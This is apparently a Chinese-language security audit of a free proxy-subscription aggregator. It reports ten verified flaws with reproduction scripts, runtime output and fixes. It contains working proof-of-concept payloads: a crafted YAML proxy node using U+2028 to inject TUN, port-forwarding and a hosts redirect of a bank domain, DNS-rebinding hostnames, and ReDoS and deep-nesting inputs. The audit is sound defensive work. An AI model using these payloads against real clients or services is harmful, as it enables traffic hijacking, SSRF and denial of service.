# 安全审计 B · 不可信输入与产物

- 目标：`E:\AI\freeVPN`（公开免费代理订阅聚合器）
- 范围：`security.py` 的输入隔离/节点审计/分流规则；`pool.py` 的解析器、归一清洗、产物生成
- 方法：全部结论均由**实跑**得出。验证脚本在 `audit/` 下，输出在同目录 `_out_*.txt`
- 审计性质：只读。未修改 `pool.py` / `security.py`
- 环境：Python 3.13.13 / PyYAML 6.0.3 / `bin/mihomo.exe`（内核配置校验与真实拨号观测）
- **被审计版本指纹**（行号以此为准；若 Lead 已改过这两个文件，行号可能漂移）：

  ```
  pool.py      SHA256 20D6AF3E59C8835CCD049D25ABDCFFCF8FB78B5299967E862EE2A23B23BB690C
               95519 字节, mtime 2026-09-30 18:26:09
  security.py  SHA256 79524915866A79E04DCFCF5AE507BC90A660DBB91B8D98131E0C09BE705DB3E5
               16744 字节, mtime 2026-09-30 17:04:56
  ```

  审计前后项目自带自检均通过（`python security.py` 7 个探针符合预期；
  `python state/test_naming.py` 3 项 PASS），确认审计过程未污染基线。

复现命令：

```
cd E:\AI\freeVPN
$env:PYTHONIOENCODING='utf-8'
python -X utf8 audit\b1_audit_bypass.py      # 问题 1
python -X utf8 audit\b1b_kernel_resolve.py   # 问题 1（内核是否解析简写地址）
python -X utf8 audit\b1c_rebind.py           # 问题 1（DNS 重绑定完整链路）
python -X utf8 audit\b2_kernel_keys.py       # 问题 2
python -X utf8 audit\b2b_scv.py              # 问题 2（整型→布尔 / 键名大小写）
python -X utf8 audit\b3_injection.py         # 问题 3
python -X utf8 audit\b4_fuzz.py              # 问题 4
python -X utf8 audit\b4b_crash.py            # 问题 4（异常定位）
python -X utf8 audit\b4c_deepcrash.py        # 问题 4（端到端崩溃）
python -X utf8 audit\b5_mini_yaml.py         # 问题 5
python -X utf8 audit\b6_rules.py             # 问题 6
python -X utf8 audit\b7_links.py             # 问题 7
python -X utf8 audit\b8_memory.py            # 问题 8
```

---

## B-1 【严重】产物 YAML 顶层注入：键名里的 Unicode 行分隔符逃逸出 `proxies` 段

**位置**
- `pool.py:639` `_CTRL_RE = re.compile(r"[\x00-\x1f\x7f]")` —— 只覆盖 ASCII 控制符
- `pool.py:642-655` `scrub()` —— 递归剔除的就是 `_CTRL_RE`
- `pool.py:1388` / `pool.py:1395` `_yaml_lines()` —— `f"{pad}{k}:"`，**键名不加引号、不做转义**
- `pool.py:698` `normalize()` 末尾 `return scrub(out)` —— 攻击者键名原样保留
- `pool.py:1417-1418` `strip_private()` —— 只剔 `_` 前缀，不校验键名
- 注入在 `_dump_yaml()` 序列化阶段发生，因此 `security.py:261-283 harden_kernel_config()` 的收口被绕过

**证据**

第一步：`U+2028 / U+2029 / U+0085` 三个字符同时满足「scrub 不清除」和「YAML 读取端当换行」（`audit/b3_probe_injection.py`）：

```
=== 1. scrub() 对各类分隔符的存活情况 ===
  U+2028 LINE SEPARATOR      经 scrub 存活: True
  U+2029 PARAGRAPH SEP       经 scrub 存活: True
  U+0085 NEL                 经 scrub 存活: True
  U+000A LF                  经 scrub 存活: False
=== 3. PyYAML 读入端是否把它当行边界 ===
  U+2028 LINE SEPARATOR      safe_load -> {'a': 1, 'b': 2}
  U+0085 NEL                 safe_load -> {'a': 1, 'b': 2}
```

第二步：端到端（`audit/b3_injection.py`）。攻击者在 Clash YAML 源里给节点加一个键名，键名内用 YAML 双引号转义写入 `\u2028`：

```yaml
proxies:
  - name: "evil-node"
    type: vmess
    server: 1.2.3.4
    port: 443
    uuid: 11111111-2222-3333-4444-555555555555
    alterId: 0
    cipher: auto
    tls: true
    "x: 1\u2028tun:\u2028  enable: true\u2028  stack: system\u2028  auto-route: true\u2028  auto-detect-interface: true\u2028  #": "1"
```

```
### A. 注入 tun —— harden_kernel_config 明确 pop 掉的键
--- parse_any=1 dedupe=1 审计放行=1 拦截=0 告警=0 ---
--- 审计放行节点的键名 (repr) ---
    'name' 'type' 'server' 'port' 'uuid' 'alterId' 'cipher' 'tls'
    'x: 1\u2028tun:\u2028  enable: true\u2028  stack: system\u2028  auto-route: true\u2028  auto-detect-interface: true\u2028  #'
--- 产物 YAML 反解顶层键 ---
    ['allow-lan','dns','find-process-mode','ipv6','log-level','mixed-port','mode',
     'profile','proxies','proxy-groups','rules','tcp-concurrent','tun','unified-delay']
--- 目标顶层键 'tun' 是否出现: True ---
    tun = {"enable": true, "stack": "system", "auto-route": true, "auto-detect-interface": true}
--- mihomo -t (产物) 退出码 0 ---
    configuration file ...\_poc_tun.yaml test is successful
```

同一脚本对 `tunnels`（内核自带任意 TCP 端口转发）与 `hosts`（DNS 覆盖）同样成功：

```
--- 目标顶层键 'tunnels' 是否出现: True ---
    tunnels = ["tcp,0.0.0.0:13389,1.2.3.4:3389"]
--- 目标顶层键 'hosts' 是否出现: True ---
    hosts = {"+.icbc.com.cn": "1.2.3.4"}
```

第三步：绕过 `harden_kernel_config`（本机实际加载的那份内核配置，用例 D）：

```
--- harden_kernel_config 之前 cfg 里有 tun 吗: False ---
--- harden_kernel_config 之后 cfg 里有 tun 吗: False  (被 pop, 收口生效) ---
--- 序列化后反解, tun 是否复活: True -> {'enable': True, 'stack': 'system', 'auto-route': True, 'auto-detect-interface': True}
--- mihomo -t (内核配置) 退出码 0 ---
    configuration file ...\_poc_kernel.yaml test is successful
--- 启动 8 秒后内核仍存活: True (配置被接受) ---
--- 运行期日志中与 tun / 注入相关的行 ---
    level=warning msg="[TUN] default interface changed by monitor, => 以太网"
    level=error   msg="Start TUN listening error: configure tun interface: Access is denied."
```

内核**真的去创建了 TUN 设备**（`[TUN] default interface changed by monitor` 之后才因非管理员权限失败）。以管理员身份运行、或客户端本身已装 TUN 适配器时这条链会直接生效。

**影响**
单条恶意节点（不需要是可用节点）即可：
1. 向所有客户端下载的 `out/*.yaml` 注入任意顶层键 —— `tun`（系统级透明代理，改路由表）、`tunnels`（内核内置任意 TCP 端口转发）、`hosts`（DNS 覆盖，可把 `+.icbc.com.cn` 指向任意 IP）、`sniffer`、`authentication`、`listeners`、`external-controller` + `secret` 等；
2. 绕过 `harden_kernel_config()` 对 `tun` / `external-ui` 的移除，使本机 L2 测速内核也带 TUN 启动；
3. 该节点通过 `audit_pool` 时 **0 拦截 0 告警**，并通过 `prune_bad_nodes()` 的 `mihomo -t` 校验（因为校验用的也是被注入的配置）。

可达路径：`sources.txt` 里有 15 个 Clash YAML 源；此外 `pool.py:909 MIRRORS = ("https://ghfast.top/", "https://gh-proxy.com/", "https://ghproxy.net/")` 是第三方 HTTP 转发，**任何源（包括 base64 订阅）经镜像返回 Clash YAML 都会被 `parse_any` 按 YAML 解析**（`pool.py:951`）。即注入面 = 15 个 YAML 源 + 3 个第三方镜像。

**修复建议**
1. `_CTRL_RE` 扩到 Unicode 行分隔符：`re.compile(r"[\x00-\x1f\x7f\x85\u2028\u2029]")`，或直接 `str.isprintable()` 白名单化；
2. 根因在 `_yaml_lines()` 输出键名不转义 —— 键名同样用 `_scalar()` 风格加引号并转义（`"..."` + `\\`/`\"`），或干脆**丢弃非白名单键**；
3. `normalize()` 改为键白名单（见 B-2），而不是当前的黑名单 7 个键；
4. 产物生成后加一道自校验：`yaml.safe_load(build_clash(...))` 反解出的顶层键集合必须等于预期集合，不等则拒绝写盘。

---

## B-2 【高】节点字段全量透传：攻击者可给内核塞任意选项，`dialer-proxy` 实测生效

**位置**
- `pool.py:672-678` `normalize()`：`out = dict(p)` 之后只 pop 掉 `("id","aid","ps","add","scy","v","host","path","tls_sni")` 7 个键，其余全部透传
- `pool.py:1077` `_write_kernel_config()`：同样 `{k: v for k, v in n.items() if not k.startswith("_")}`
- `pool.py:1422` `build_clash()`：`strip_private(n)` 后直接进产物

**证据**（`audit/b2_kernel_keys.py` 2.1）

```
### 2.1 危险键能否穿过 parse_clash_yaml -> normalize -> audit_pool -> 产物
  parse_any=1 normalize 后=1 审计放行=1 拦截=0 告警=0
  产物 proxies[0] 里存活的键:
    ['alterId','brutal-opts','cipher','client-fingerprint','dialer-proxy','fingerprint',
     'interface-name','ip-version','mptcp','name','packet-encoding','port','reality-opts',
     'routing-mark','server','server-cert-fingerprint-sha256','smux','subname','tfo',
     'tls','type','udp-over-tcp','uuid','ws-opts']
  mihomo -t 退出码 0  -> 内核接受
```

`dialer-proxy` 不只是"被接受"，而是**被真正执行**（同脚本 2.2，本机起监听观察拨号）：

```
  inner: type=ss server=198.51.100.7:8080 dialer-proxy=outer
  outer: type=http server=127.0.0.1:19555
  本机 19555 端口收到的代理请求:
    ['CONNECT 198.51.100.7:8080 HTTP/1.1', 'CONNECT 198.51.100.7:8080 HTTP/1.1', ... ×10]
  => 内核执行了节点里的 dialer-proxy: 出站先经过攻击者指定的另一个节点
```

**影响**
节点持有者本就能看到明文目标域名，但透传把权限从"看流量"扩到"改客户端行为"：
- `dialer-proxy`：强制该节点的出站先经过攻击者指定的另一个节点/分组（可指向产物里永远存在的分组名 `🚀 节点选择`，已实测内核接受），形成攻击者可控的代理链，或造成环路；
- `interface-name`：把出站 socket 绑到指定网卡；
- `routing-mark`（Linux `SO_MARK`）、`ip-version`（强制 v6）、`tfo`/`mptcp`/`smux`/`packet-encoding`/`udp-over-tcp`：改变内核网络栈行为；
- `reality-opts`、`server-cert-fingerprint-sha256`、`ws-opts` 等直接覆盖 TLS/传输层参数。

另有一个可用性副作用：`dialer-proxy` 指向不存在的名字会让内核**拒绝整份配置**（实测 `proxy [🌐 evil] dialer-proxy [other-node] not found` → `test failed`）。L2 阶段 `probe_real()` 会对每个分片跑 `prune_bad_nodes()`，所以这类节点进不了 `out/*.yaml`（`write_outputs` 用的是剔除后的 `final`）—— 但代价是**该分片内其它正常节点会被一起拖累**，且 `--no-l2` 或 L2 无结果回退到 L1 时（`pool.py:2243-2245`）没有这道兜底。

**修复建议**
`normalize()` 改成**按 type 的白名单**：每种协议只保留内核确实需要的字段（如 vmess: `name/type/server/port/uuid/alterId/cipher/tls/servername/network/ws-opts/grpc-opts/h2-opts/http-opts/alpn/client-fingerprint/skip-cert-verify`），白名单外一律丢弃并计入审计告警。同时给 `_write_kernel_config()` 加一层独立白名单 —— 内核配置比客户端订阅更敏感。

---

## B-3 【高】DNS 重绑定 / 通配域名绕过 `bad_server`：节点可指向回环与内网，内核真实连上

**位置**
- `pool.py:745-761` `bad_server()`：先查后缀黑名单，再 `ipaddress.ip_address(h)`，失败即 `return False  # 域名, 放行`
- `security.py:115-120` `_host_kind()` 同构
- `security.py:140-143`：只按 `_INTERNAL_SUFFIX` 后缀 + 正则字符集判定

**证据**

`audit/b1_audit_bypass.py` 1.1/1.2 —— 纯 IP 字面量全被挡，域名形式全部放行：

```
  点分四段   127.0.0.1              -> DROPPED-normalize
  localhost                        -> DROPPED-normalize
  evil.local                       -> DROPPED-normalize
  127.0.0.1.nip.io 重绑定域名         -> PASS(进入产物)
  127-0-0-1.sslip.io 重绑定域名       -> PASS(进入产物)
  localtest.me 重绑定域名             -> PASS(进入产物)
  192.168.1.1.nip.io               -> PASS(进入产物)
  10-0-0-1.sslip.io                -> PASS(进入产物)
```

`audit/b1_audit_bypass.py` 1.6 —— 这些域名真的解析到内网：

```
  127.0.0.1.nip.io           bad_server=False -> ['127.0.0.1']
  127-0-0-1.sslip.io         bad_server=False -> ['127.0.0.1']
  localtest.me               bad_server=False -> ['127.0.0.1']
  10-0-0-1.sslip.io          bad_server=False -> ['10.0.0.1']
```

`audit/b1c_rebind.py` —— 完整链路：节点过审计、进产物、内核解析并**连上本机监听端口**：

```
本机监听 127.0.0.1:19445; mihomo mixed-port 17903
  127.0.0.1.nip.io       audit: block=[] warn=[]
      -> 本机 19445 端口收到入站连接: 1 次
         来自 127.0.0.1:21353 的入站连接, 前 32 字节 = b'`\xbc$\xa6\x8d\xcbgD\xd4;[a\x13\xcd\x8c\x9b(\xfc}i\x07v\xb7B-99\x96\xb40\x16\xb3'
  127-0-0-1.sslip.io     audit: block=[] warn=[]   -> 收到入站连接: 1 次
  localtest.me           audit: block=[] warn=[]   -> 收到入站连接: 1 次
```

**影响**
`bad_server()` 的 docstring 写明的威胁模型（"127.0.0.53 诱饵节点，TCP 能连通本机，会骗过 L1 探活污染池子"）被完整绕过：
- 攻击者用 `*.nip.io` / `*.sslip.io` / 自控域名即可让"节点服务器"落到 127.0.0.1、10.x、169.254.169.254 等；
- 本机端口开放时 L1 TCP 探活会**成功**，诱饵节点稳定入池并进入最终产物；
- 客户端会把代理协议字节打到本机/内网服务上（实测已收到 shadowsocks 握手字节）。

**修复建议**
1. 出站前对域名做一次解析，`socket.getaddrinfo` 得到的每个地址都要过一遍 `bad_server()` 的 IP 判定；解析到回环/私网/链路本地/保留段即 block（可在 L1 探活时顺手做，成本几乎为零）；
2. `_INTERNAL_SUFFIX` 补 `.localdomain`、`.home`、`.workgroup`、`.lan.`，并对**单标签主机名**（`router`/`nas`/`printer`，实测全部 PASS）单独告警；
3. 对已知通配 DNS 后缀（`nip.io`、`sslip.io`、`xip.io`、`traefik.me`、`lvh.me`）直接 block。

---

## B-4 【高】`AD_PAT` 正则 ReDoS：单节点名字几千字节即可让刷新卡死数小时

**位置**
- `pool.py:623-625` `AD_PAT`：`...|\|?\s*(?:tg|电报)?\s*(?:频道|群组|群|订阅|节点分享|免费节点|公益|机场推荐)`
- `pool.py:630` `clean_name()`：`n = AD_PAT.sub(" ", n)` —— 在 `name[:38]` 截断**之前**，且输入来自不可信源、长度无上限
- 调用链：`dedupe → normalize → clean_name`（`pool.py:686`）

**证据**（`audit/b4_fuzz.py` 4.3，输入形如 `'|' + ' '×N + '!'`）

```
  AD_PAT.sub   N=  500 耗时=    0.244s
  AD_PAT.sub   N= 1000 耗时=    1.884s  (比上一档放大 7.7×)
  AD_PAT.sub   N= 1500 耗时=    6.375s  (比上一档放大 3.4×)
  AD_PAT.sub   N= 2000 耗时=   15.059s  (比上一档放大 2.4×)
  AD_PAT.sub   N= 4000 耗时=  119.511s  (比上一档放大 7.9×)
```

端到端（同脚本）：

```
  端到端: normalize() 一个名字含大量空格的节点
  normalize  名字长度= 1000 耗时=    1.933s
  normalize  名字长度= 2000 耗时=   15.220s
```

**影响**
名字长度每翻倍耗时约 ×8（≈O(n³)，`\s*` + 可选组 + `\s*` 的组合在每个起始位置回溯）。外推：

| 名字长度 | 单节点 `normalize` 耗时 |
|---|---|
| 4 KB | 约 2 分钟（实测 119.5s） |
| 8 KB | 约 16 分钟 |
| 32 KB | 约 16 小时 |
| 128 KB | 约 10 天 |

32KB 的名字远在 4MB 的 `clamp_text` 上限之内，而且 `clean_name` 的 `n[:38]` 截断发生在正则之后 —— 长度上限形同不存在。一个源里放几个这种节点，`run_cycle` 的 `dedupe` 阶段就永远跑不完；daemon 模式下每一轮都会卡在这里。

**修复建议**
1. **先截断再清洗**：`clean_name` 开头就 `raw = str(raw or "")[:200]`；
2. 重写 `AD_PAT` 去掉两个 `\s*` 相邻的歧义结构，例如先 `n = re.sub(r"\s+", " ", n)` 归一空白，再用 `\|?\s?(?:tg|电报)?\s?(?:频道|群组|...)` 或直接 `(?:\|)?(?:tg|电报)?(?:频道|群组|群|订阅|节点分享|免费节点|公益|机场推荐)`；
3. 给名字长度加硬上限（`security.py` 里加 `MAX_NAME_CHARS = 128`），并在 `normalize` 里统一执行。

---

## B-5 【中】深嵌套节点 → `RecursionError` → 整轮刷新崩溃

**位置**
- `pool.py:642-655` `scrub()`（递归）
- `pool.py:1382-1410` `_yaml_lines()`（递归）
- `pool.py:2215` `run_cycle()` 里 `nodes = dedupe(raw)` —— **没有 try/except**
- `pool.py:2321` / `pool.py:2355` `main()` 里 `run_cycle(args)` —— **没有 try/except**

**证据**（`audit/b4_fuzz.py` 4.4）

```
  scrub 深度=600    耗时= 0.000s ok
  normalize 深度=600    耗时= 0.000s ok
  build_clash 深度=600    耗时= 0.002s ok

  scrub 深度=1000   耗时= 0.000s RecursionError: maximum recursion depth exceeded
  normalize 深度=1000   耗时= 0.001s RecursionError: maximum recursion depth exceeded
  _dump_yaml 深度=1000   耗时= 0.001s RecursionError: maximum recursion depth exceeded
  build_clash 深度=1000   耗时= 0.002s RecursionError: maximum recursion depth exceeded
```

端到端（`audit/b4c_deepcrash.py`，源用缩进块式，PyYAML 先在深嵌套处 `RecursionError` → 落到 `_mini_yaml_proxies` → 造出 1500 层 dict）：

```
恶意源体积: 1113.0 KB, 缩进层数: 1500
yaml_bomb 判定: False (False = 放行)
parse_any 成功返回 1 个节点, 耗时 0.07s
  节点 dict 嵌套深度 ≈ 1500
--- 接下来调用 run_cycle 里用的 dedupe() ---
*** dedupe 抛出 RecursionError: maximum recursion depth exceeded
    run_cycle() 里 `nodes = dedupe(raw)` 没有 try/except,
    main() 里 `run_cycle(args)` 也没有 —— 进程会带 traceback 退出。
        File "E:\AI\freeVPN\pool.py", line 698, in normalize
          return scrub(out)
        File "E:\AI\freeVPN\pool.py", line 652, in scrub
          return {k: scrub(x) for k, x in v.items()}
      RecursionError: maximum recursion depth exceeded

--- 对照: 若节点嵌套浅于 ~600 层 ---
  深度=900   源=413550  字节 -> dedupe 正常, 产出 1 节点
  深度=1100  源=615550  字节 -> RecursionError: maximum recursion depth exceeded
```

**影响**
一个约 600KB 的源即可让 `pool.py all` 带 traceback 退出。daemon 模式下 `run_child` 只看到返回码非 0，而 `last_full` 已经更新（`pool.py:2377-2378`），于是**每 `interval` 分钟才重试一次并继续失败** —— 池子停止更新，订阅长期停留在旧产物。这正好打掉这个项目唯一的价值来源（新鲜节点）。

**修复建议**
1. `run_cycle` 的 `dedupe(raw)` / `audit_pool` / `write_outputs` 各包一层 `try/except Exception`，坏源只丢源不丢整轮；
2. `scrub` / `_yaml_lines` 改为显式栈的迭代实现，或加 `MAX_NEST_DEPTH = 16`：`normalize` 时把超过深度的子结构直接丢弃；
3. `parse_clash_yaml` 里对 `_mini_yaml_proxies` 的产出做一次深度检查（自实现迭代遍历，不用递归）。

---

## B-6 【中】PyYAML 深嵌套 `safe_load` 超线性耗时，`yaml_bomb` 不检查嵌套

**位置**
- `pool.py:607` `data = _yaml.safe_load(text)`
- `security.py:52-57` `yaml_bomb()` 只做长度 + 锚点/别名计数，不看嵌套深度

**证据**（`audit/b8_memory.py` 8.8）

```
  嵌套深度=600    输入=1200  字节 耗时=   0.387s 峰值=0.9MB RecursionError
  嵌套深度=800    输入=1600  字节 耗时=   1.990s 峰值=1.0MB RecursionError
  嵌套深度=1000   输入=2000  字节 耗时=   7.053s 峰值=1.1MB RecursionError
  嵌套深度=1200   输入=2400  字节 耗时=  13.179s 峰值=1.2MB RecursionError
  嵌套深度=1500   输入=3000  字节 耗时=  15.566s 峰值=1.4MB RecursionError
```

`yaml_bomb` 对这类输入返回 False（`audit/b4c_deepcrash.py` 首段已证）。`RecursionError` 会被 `parse_clash_yaml` 的 `except Exception` 吞掉，所以不会崩，但**耗时已经发生**。

**影响**
3KB 输入即可占用一个拉源线程 15 秒；40KB（深度约 20000）外推为小时级。`collect()` 用 16 个线程处理全部源（`pool.py:978`），几个这样的源就能让整轮拉源阶段停摆。注意 `fetch_one` 的 socket 超时只约束读取，不约束解析。

**修复建议**
1. `yaml_bomb()` 增加嵌套深度扫描（迭代统计 `[`/`{` 的净深度上限，如 64 层即整源丢弃）；
2. 或改用 `yaml.compose` + 显式栈遍历，绕开递归下降；
3. 把解析放进独立线程并设 wall-clock 上限，超时即放弃该源。

---

## B-7 【中】`skip-cert-verify` 审计绕过：整型 `1` 与键名大小写/下划线变体

**位置**
- `security.py:152` `if p.get("skip-cert-verify") is True:` —— 精确键名 + 身份比较
- `pool.py:672` `out = dict(p)` —— 攻击者的键名原样带进产物

**证据**（`audit/b2_kernel_keys.py` 2.3 + `audit/b2b_scv.py`）

```
### 2.3 skip-cert-verify 变体: audit 是否漏报 / 内核是否照收
  布尔 true                      audit告警=['no-cert-verify'] mihomo -t=接受
  整数 1                         audit告警=[]                 mihomo -t=接受
  字符串 'true'                   audit告警=[]                 mihomo -t=拒绝
  键名 Skip-Cert-Verify          audit告警=[]                 mihomo -t=接受
  键名 SKIP-CERT-VERIFY + 'abc'  audit告警=[]                 mihomo -t=拒绝
      -> 'skip-cert-verify' expected type 'bool', got unconvertible type 'string'
```

关键推理链：`SKIP-CERT-VERIFY: "abc"`（全大写键）能让内核报出 **`'skip-cert-verify'`** 的类型错误 → **内核的键名匹配不区分大小写**（`skip_cert_verify: true` 同样被接受，见 `audit/b2b_scv.py` 2.5）→ 因此 `Skip-Cert-Verify: 1` / `skip_cert_verify: true` 是被内核真正解析并生效的，而 `audit_node` 的 `p.get("skip-cert-verify") is True` 看不到。

整型确实被转成布尔，用内核 API 直接观测（同脚本 2.4，`udp` 与 `skip-cert-verify` 走同一个 structure 解码器）：

```
  udp_true_bool    mihomo -t 接受; /proxies/p -> {'udp': True, ...}
  udp_int_1        mihomo -t 接受; /proxies/p -> {'udp': True, ...}
  udp_int_0        mihomo -t 接受; /proxies/p -> {'udp': False, ...}
  udp_str_true     mihomo -t 拒绝: 'udp' expected type 'bool', got unconvertible type 'string'
```

**影响**
`skip-cert-verify` 目前只产生 `warn`（不 block），所以影响是**审计结论失真**：一个关闭了证书校验、可被透明中间人劫持的节点会以"干净节点"的形态出现在报告与状态页里，用户失去唯一的提示。同时 `1 is True` 为 False 这类身份比较是典型的隐藏坑。

**修复建议**
1. 判定改成 `if _truthy_bool(p.get("skip-cert-verify"))`，其中 `_truthy_bool` 覆盖 `True/1/"1"/"true"`；
2. 键名匹配统一走一个 `norm_key = k.strip().lower().replace("_", "-")` 归一化视图；
3. 更彻底的做法就是 B-2 的键白名单 —— 白名单外的一律丢弃，这类变体自然消失。

---

## B-8 【中】分流规则缺口：云元数据只覆盖 AWS 共享 IP，内网段与银行清单有漏

**位置** `security.py:334-381`

**证据**（`audit/b6_rules.py`：把 `SECURITY_RULES` 原样喂给内核，用 mixed-port 逐个探测，读内核真实裁决日志）

内核接受全部 49 条规则（`mihomo -t` 退出码 0）。实际裁决：

```
  目标                                说明                          内核实际裁决
  169.254.169.254:80                云元数据共享 IP                  IPCIDR(169.254.169.254/32) -> REJECT
  100.100.100.200:80                阿里云元数据                     IPCIDR/100.64.0.0/10 -> DIRECT
  100.64.0.1:80                     CGNAT 100.64/10               IPCIDR/100.64.0.0/10 -> DIRECT
  127.0.0.1:80                      回环                            IPCIDR/127.0.0.0/8 -> DIRECT
  10.0.0.1:80 / 172.16.0.1:80       RFC1918                       IPCIDR/10.0.0.0/8 -> DIRECT
  224.0.0.1:80                      IPv4 组播                       IPCIDR/224.0.0.0/4 -> DIRECT
  255.255.255.255:80                广播                            IPCIDR(255.255.255.255/32) -> REJECT
  [fd00::1]:80                      IPv6 ULA                      IPCIDR/fc00::/7 -> DIRECT
  [fe80::1]:80                      IPv6 链路本地                    IPCIDR(fe80::/10) -> DIRECT
  0.0.0.0:80                        0.0.0.0/8                     Match/ -> G   *** 走免费节点 ***
  240.0.0.1:80                      240/4 保留                      Match/ -> G   ***
  192.0.0.1:80                      192.0.0.0/24 IETF             Match/ -> G   ***
  192.0.2.1:80                      TEST-NET-1                    Match/ -> G   ***
  198.51.100.1:80                   TEST-NET-2                    Match/ -> G   ***
  203.0.113.1:80                    TEST-NET-3                    Match/ -> G   ***
  198.18.0.1:80                     198.18/15 基准测试段             Match/ -> G   ***
  [::1]:80                          IPv6 回环 ::1                   Match/ -> G   ***
  [2001:db8::1]:80                  IPv6 文档段                      Match/ -> G   ***
  [ff02::1]:80                      IPv6 组播                       Match/ -> G   ***
  metadata.google.internal:80       GCP 元数据域名                    Domain(metadata.google.internal) -> REJECT
  metadata.tencentyun.com:80        腾讯云元数据域名                    Match/ -> G   *** 走免费节点 ***
  metadata.azure.com:80             Azure 元数据域名                 Match/ -> G   ***
  metadata.google.internal.nip.io:80 GCP 元数据域名绕过变体              Match/ -> G   ***
  www.cmbc.com.cn:443               民生银行                         Match/ -> G   ***
  www.citicbank.com:443             中信银行                         Match/ -> G   ***
  www.bankofshanghai.com:443        上海银行                         Match/ -> G   ***
  www.jsbchina.cn:443               江苏银行                         Match/ -> G   ***
  www.webank.com:443                微众银行                         Match/ -> G   ***
  pay.weixin.qq.com:443             微信支付                         Match/ -> G   ***
  nas.local:443                     内网域名                         DomainSuffix/local -> DIRECT
```

（`Match/ -> G` 即命中末尾的 `MATCH,🚀 节点选择`，流量进了免费节点。）

**影响与补充建议**

1. **云元数据只覆盖了 AWS/Azure/GCP/华为/Oracle 共用的 `169.254.169.254` 与 GCP 的两个域名**。腾讯云 `metadata.tencentyun.com`、Azure `metadata.azure.com`、以及 `metadata.google.internal.nip.io` 这类后缀变形全部走代理 —— 免费节点持有者可以让用户机器上的客户端去请求云元数据端点（SSRF 偷云凭证的经典姿势）。阿里云 `100.100.100.200` 落在 `100.64.0.0/10` 里被 DIRECT（不泄漏给节点，但没有 REJECT）。
   建议补：
   ```
   IP-CIDR,100.100.100.200/32,REJECT,no-resolve     # 阿里云
   IP-CIDR,169.254.0.0/16,REJECT,no-resolve         # 整段链路本地直接拒（当前是 DIRECT）
   DOMAIN-SUFFIX,tencentyun.com,REJECT
   DOMAIN-SUFFIX,metadata.azure.com,REJECT
   DOMAIN-SUFFIX,metadata.google.internal,REJECT     # 用 SUFFIX 覆盖 *.nip.io 之类的变形
   DOMAIN-SUFFIX,metadata.goog,REJECT
   IP-CIDR6,fd00:ec2::254/128,REJECT,no-resolve      # AWS IMDSv6
   ```

2. **内网段漏项**（实测全部走代理）：`0.0.0.0/8`、`240.0.0.0/4`、`192.0.0.0/24`、`192.0.2.0/24`、`198.51.100.0/24`、`203.0.113.0/24`、`198.18.0.0/15`、`::1/128`、`2001:db8::/32`、`ff00::/8`。其中 `::1/128` 是 IPv6 回环，`ff00::/8` 是 IPv6 组播 —— `ipv6: False` 只影响生成配置，规则列表本身应当完整。
   建议补：`IP-CIDR,0.0.0.0/8,DIRECT,no-resolve`、`IP-CIDR,240.0.0.0/4,DIRECT,no-resolve`、`IP-CIDR,192.0.0.0/24,DIRECT,no-resolve`、`IP-CIDR,192.0.2.0/24,DIRECT,no-resolve`、`IP-CIDR,198.51.100.0/24,DIRECT,no-resolve`、`IP-CIDR,203.0.113.0/24,DIRECT,no-resolve`、`IP-CIDR6,::1/128,DIRECT,no-resolve`、`IP-CIDR6,2001:db8::/32,DIRECT,no-resolve`、`IP-CIDR6,ff00::/8,DIRECT,no-resolve`。
   注：`198.18.0.0/15` 是产物自己的 `fake-ip-range`（`pool.py:1496`），是否直连取决于设计意图，这里只作提示。

3. **银行/支付清单漏主流行**：民生 `cmbc.com.cn`、中信 `citicbank.com`、上海 `bankofshanghai.com`、江苏 `jsbchina.cn`、浙商 `czbank.com`、恒丰 `hfbank.com.cn`、渤海 `cbhb.com.cn`、微众 `webank.com`、网商 `mybank.cn`、北京农商 `bjrcb.com`；支付侧漏 `weixin.qq.com` / `wechat.com`（微信登录与支付）、`jdpay.com`、`alipay.cn`、`95555.com`(招行短域名)。`gov.cn` 用 `DOMAIN-SUFFIX` 已覆盖全部政务子域，这块没问题。

4. 规则顺序（元数据 REJECT > 敏感 DIRECT > 内网 DIRECT > LOCAL > MATCH 代理）实测符合注释描述，无优先级倒挂。

---

## B-9 【中】`tuic` 的 uuid 未做任何校验，生成结构破损的链接污染通用订阅

**位置**
- `pool.py:790-792` `bad_credential()`：`elif t in ("trojan","hysteria2","hy2","tuic","anytls")` 只检查 `password` 非空，**不校验 uuid**
- `pool.py:890` `proxy_to_link()`：`f"tuic://{p.get('uuid','')}:{quote(password)}@..."` —— uuid 未做 `quote`

**证据**（`audit/b7_links.py` 7.4）

```
  tuic  uuid      = 'u@evil.com'   -> 存活, 链接: tuic://u@evil.com:pw@1.2.3.4:443?#%F0%9F%8C%90%20n
  tuic  uuid      = 'u#frag'       -> 存活, 链接: tuic://u#frag:pw@1.2.3.4:443?#%F0%9F%8C%90%20n
  tuic  uuid      = 'u?q=1'        -> 存活, 链接: tuic://u?q=1:pw@1.2.3.4:443?#%F0%9F%8C%90%20n
  vless uuid      = 'u#frag'       -> normalize 丢弃 (已挡)
```

对照：`vless`/`vmess` 的 uuid 有 `re.fullmatch(r"[0-9a-fA-F\-]{16,48}", u)` 兜住，`tuic` 没有。这些 uuid 值可以从 Clash YAML 源直接给出（`uuid: "u#frag"`），不经过 URL 解析。

**影响**
`u#frag` 会让 authority 段在 `#` 处提前终止；`u?q=1` 会让查询串从错误位置开始。客户端对 `tuic://` 的 netloc 解析策略不同（`urlsplit` 取**最后一个** `@`，很多客户端取第一个），因此这条链接在不同客户端上会指向不同主机或直接解析失败。这类坏行会进入 `out/pool.txt` 的通用订阅（base64），一个解析失败的行可能让整个订阅导入失败。同脚本 7.3 的对照测试显示正常名字下订阅结构完好：

```
### 7.3 通用订阅 (build_b64) 结构是否被污染
  节点数=90  解码后行数=90  一致
  不以已知协议开头的行: 0
```

**修复建议**
`bad_credential()` 里给 `tuic` 的 `uuid` 加与 `vless` 相同的字符集校验（或直接 `_UUID_RE`）；`proxy_to_link()` 里 uuid 与 password 统一 `urllib.parse.quote(..., safe="")`。

---

## B-10 【低】`parse_vmess` 对 JSON 顶层非 object 抛 `AttributeError`

**位置** `pool.py:243-246` —— `o = json.loads(txt)` 之后直接 `o.get("add")`，没有 `isinstance(o, dict)` 检查

**证据**（`audit/b4b_crash.py`）

```
  b'[]'                  -> *** AttributeError: 'list' object has no attribute 'get' ***
     经 parse_links -> []
     经 parse_any   -> []
  b'123'                 -> *** AttributeError: 'int' object has no attribute 'get' ***
  b'null'                -> *** AttributeError: 'NoneType' object has no attribute 'get' ***
  b'true'                -> *** AttributeError: 'bool' object has no attribute 'get' ***
```

